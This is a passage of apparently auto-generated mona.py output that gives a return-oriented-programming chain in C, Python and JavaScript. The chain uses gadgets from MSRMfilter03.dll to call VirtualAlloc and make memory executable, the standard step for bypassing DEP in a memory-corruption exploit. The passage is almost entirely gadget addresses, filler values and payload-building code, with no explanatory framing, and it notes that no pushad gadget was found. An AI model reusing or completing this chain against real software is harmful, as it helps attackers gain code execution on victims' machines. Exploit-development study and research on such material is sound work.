      0x10024a09,  // RETN (ROP NOP) [MSRMfilter03.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x1002a86b,  // POP EAX // RETN [MSRMfilter03.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x00000000,  // [-] Unable to find pushad gadget
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x1002d61a,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x10032078,  # ptr to &VirtualAlloc() [IAT MSRMfilter03.dll]
      0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
      0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x10027d2c,  # POP EBP # RETN [MSRMfilter03.dll] 
      0x1001b058,  # & push esp # ret  [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x1000a0fa,  # POP EBX # RETN [MSRMfilter03.dll] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x100288f8,  # POP EDX # RETN [MSRMfilter03.dll] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x100034ea,  # POP ECX # RETN [MSRMfilter03.dll] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x1002c309,  # POP EDI # RETN [MSRMfilter03.dll] 
      0x10024a09,  # RETN (ROP NOP) [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x1002a86b,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%ud61a%u1002" + // 0x1002d61a : ,# POP EAX # RETN [MSRMfilter03.dll] 
    "%u2078%u1003" + // 0x10032078 : ,# ptr to &VirtualAlloc() [IAT MSRMfilter03.dll]
    "%ue0c8%u1002" + // 0x1002e0c8 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
    "%ua788%u1001" + // 0x1001a788 : ,# PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u7d2c%u1002" + // 0x10027d2c : ,# POP EBP # RETN [MSRMfilter03.dll] 
    "%ub058%u1001" + // 0x1001b058 : ,# & push esp # ret[MSRMfilter03.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%ua0fa%u1000" + // 0x1000a0fa : ,# POP EBX # RETN [MSRMfilter03.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u88f8%u1002" + // 0x100288f8 : ,# POP EDX # RETN [MSRMfilter03.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u34ea%u1000" + // 0x100034ea : ,# POP ECX # RETN [MSRMfilter03.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%uc309%u1002" + // 0x1002c309 : ,# POP EDI # RETN [MSRMfilter03.dll] 
    "%u4a09%u1002" + // 0x10024a09 : ,# RETN (ROP NOP) [MSRMfilter03.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%ua86b%u1002" + // 0x1002a86b : ,# POP EAX # RETN [MSRMfilter03.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
    ""); //  : 


--------------------------------------------------------------------------------------------------

